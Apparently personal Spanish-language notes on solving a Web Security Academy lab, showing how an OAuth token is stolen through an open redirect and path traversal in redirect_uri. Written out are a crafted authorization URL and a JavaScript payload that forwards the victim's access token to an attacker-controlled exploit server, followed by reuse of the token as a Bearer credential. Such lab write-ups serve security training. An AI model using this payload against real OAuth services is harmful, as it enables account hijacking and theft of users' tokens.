![[Pasted image 20230214134931.png]]


![[Pasted image 20230314114555.png]]

antes de darle sign-in activar el intercept en modo off

![[Pasted image 20230414142918.png]]


verifico en el history de intercept:

![[Pasted image 20230414143027.png]]


esta traza la mando al repeater; asi mismo, hago un logout y luego un login with social media; luego en el history busco el request cuando se hace login con el token que ya existe de login with social media, cuando lo encuentro lo mando al repeater:

![[Pasted image 20230414143347.png]]

En esta fase vamos a probar si hay cambios modificando el parametro redirect_uri:

![[Pasted image 20230414143606.png]]

modificando a localhost:

![[Pasted image 20230414143639.png]]

haciendo rollback:

![[Pasted image 20230414143713.png]]

probando si podemos usar un path traversal:

![[Pasted image 20230414143827.png]]

puesto que si es vulnerable a path traversal activamos el intercept hacemos logout y login with social media, cuando ya haya llegado a este request uso el path traversal para acceder a una entrada del blog:

primer request interceptado:

![[Pasted image 20230414144153.png]]

segundo request:

![[Pasted image 20230414144228.png]]

tercer request:
![[Pasted image 20230414144308.png]]

aca hago la modificación al final de callback: /../post?postId=1

cuando ya tenga el post en pantalla apago el intercept:

![[Pasted image 20230414144447.png]]

![[Pasted image 20230414144520.png]]

me voy al final del post y verifico si puedo pasarme al segundo post:

![[Pasted image 20230414144633.png]]

![[Pasted image 20230414144701.png]]

puesto que se pudo ahora voy al history y busco la redirección al segundo post del blog y lo mando al repeater:

![[Pasted image 20230414144836.png]]

![[Pasted image 20230414144939.png]]

en este endpoint trato de modificar el path para verificar si puedo tener un redirect:

![[Pasted image 20230414145101.png]]

puesto que funciona ahora ya sabemos en que script hacer el secuestro del toekn. Entonces nos vamos al exploit server para probar payloads.

Script para ejecutar el exploit que utiliza michael sommer en el video:

https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email

<script>
if(!document.location.hash){
   window.location = 'https://YOUR-LAB-AUTH-SERVER.web-seurity-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web.security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
   } else {
   window.location = '/?'+document.location.hash.substr(1)
   }
</script>


Ajustandolo a mi sesion: en esencia toda la info que necesito esta en el repeater del LOGIN WITH Token:

![[Pasted image 20230414145331.png]]


https://oauth-0a91002a04b2f97381e9649902b00093.oauth-server.net/auth?client_id=omjr5ccbkaj82ywymlo0o&redirect_uri=https://0aa1005f048ef9c58132669700850042.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0600f50423f92781a365da01b500d4.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email

una vez que ya tengo este url maquetado lo pego en una pestaña y debería tener el Hello World del Exploit Server:

![[Pasted image 20230414150025.png]]

puesto que funciono hoy modificamos el script:

![[Pasted image 20230414150352.png]]

guardo y voy a access log:

![[Pasted image 20230414150418.png]]

ahora voy a la pestaña donde obtuve el hello world, hago nuevamente el request y verifico el access log:

![[Pasted image 20230414150504.png]]

me redirigió a la pagina del exploit server, verificando el access log:

![[Pasted image 20230414150551.png]]

podemos ver que hubo 4 eventos nuevos, entonces hoy usare la segunda parte del payload:

<script>
if(!document.location.hash){
   window.location = 'https://YOUR-LAB-AUTH-SERVER.web-seurity-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web.security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
   } else {
   window.location = '/?'+document.location.hash.substr(1)
   }
</script>

tomando los datos del request de login with social media:

<script>
if(!document.location.hash){
   window.location = 'https://oauth-0a91002a04b2f97381e9649902b00093.oauth-server.net/auth?client_id=omjr5ccbkaj82ywymlo0o&redirect_uri=https://0aa1005f048ef9c58132669700850042.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0600f50423f92781a365da01b500d4.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
   } else {
   window.location = '/?'+document.location.hash.substr(1)
   }
</script>

pegnado en el exploit server y presionando store:

![[Pasted image 20230414151409.png]]

luego view exploit y me debe redirigir al exploit server y efectivamente lo hizo, luego voy al access log y ahi veo una entrada con un access token:

![[Pasted image 20230414151545.png]]

puesto que este es la ip del exploit server regreso al exploit server, presiono Deliver to Victim y regreso al access log:

![[Pasted image 20230414151716.png]]

ahora ya obtuve el access token del server

![[Pasted image 20230414151800.png]]

ese token lo voy a copiar en el tab de GET ME y lo substituyo en la parte del Authorization Bearer:

![[Pasted image 20230414152107.png]]

substituyo en el token recien obtenido:

![[Pasted image 20230414152212.png]]

asegurarme de copiarlo todo, había dejado afuera la ultima parte -CS- por eso la primera vez me dio invalid token, pero efectivamente el proceso funcionó y ahora esa apiKey la envío para resolver el lab:

![[Pasted image 20230414152341.png]]

![[Pasted image 20230414152402.png]]

